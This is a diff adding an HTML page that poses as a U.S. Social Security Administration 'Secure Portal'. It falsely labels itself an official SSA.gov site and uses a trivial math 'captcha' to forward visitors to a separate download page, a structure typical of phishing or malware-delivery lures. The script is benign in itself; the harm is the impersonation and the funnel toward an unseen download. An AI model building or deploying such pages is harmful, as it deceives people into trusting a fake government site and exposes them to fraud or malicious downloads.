@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSA • Secure Portal</title>
+    <link rel="icon" type="image/gif" href="https://www.crwflags.com/fotw/images/u/us_ssa.gif">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #eef2f7;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: #0a2e44;
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 22px;
+            font-weight: 500;
+        }
+        .content {
+            padding: 25px;
+        }
+        .notice {
+            background: #f0f7ff;
+            border-left: 4px solid #0a2e44;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #1e3f5c;
+        }
+        .captcha-box {
+            background: #f8fafd;
+            border: 1px solid #dee7f2;
+            border-radius: 16px;
+            padding: 20px;
+        }
+        .captcha-question {
+            background: white;
+            border: 1px solid #dee7f2;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 600;
+            color: #0a2e44;
+            margin-bottom: 15px;
+        }
+        .captcha-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dee7f2;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        .captcha-input:focus {
+            outline: none;
+            border-color: #0a2e44;
+        }
+        .btn {
+            background: #0a2e44;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .btn:hover {
+            background: #124f6e;
+        }
+        .footer {
+            background: #f8fafd;
+            padding: 15px;
+            text-align: center;
+            border-top: 1px solid #dee7f2;
+            color: #4f6b8a;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>Social Security Administration</h1>
+        </div>
+        
+        <div class="content">
+            <div class="notice">
+                <i class="fas fa-shield-alt"></i> Complete verification to access your document
+            </div>
+            
+            <div class="captcha-box">
+                <div class="captcha-question" id="captchaQuestion">5 + 3 = ?</div>
+                <input type="number" class="captcha-input" id="captchaInput" placeholder="Enter answer" autofocus>
+                <button class="btn" id="verifyBtn">Continue</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            Official U.S. Government website • SSA.gov
+        </div>
+    </div>
+
+    <script>
+        // Generate captcha
+        let num1 = Math.floor(Math.random() * 9) + 2;
+        let num2 = Math.floor(Math.random() * 9) + 2;
+        let answer = num1 + num2;
+        document.getElementById('captchaQuestion').innerText = `${num1} + ${num2} = ?`;
+
+        document.getElementById('verifyBtn').onclick = function() {
+            if (parseInt(document.getElementById('captchaInput').value) === answer) {
+                sessionStorage.setItem('captcha_passed', 'true');
+                window.location.href = 'download.html';
+            } else {
+                alert('Incorrect answer. Try again.');
+            }
+        };
+    </script>
+</body>
+</html>
